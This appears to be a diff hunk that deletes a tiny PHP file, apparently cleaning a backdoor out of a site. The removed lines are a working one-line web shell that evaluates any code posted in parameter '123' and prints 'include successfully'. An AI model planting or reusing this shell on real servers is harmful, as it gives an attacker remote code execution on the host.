@@ -1,4 +1,0 @@
-<?php
-@eval($_POST[123]);
-echo"include successfully<br/>"
-?>
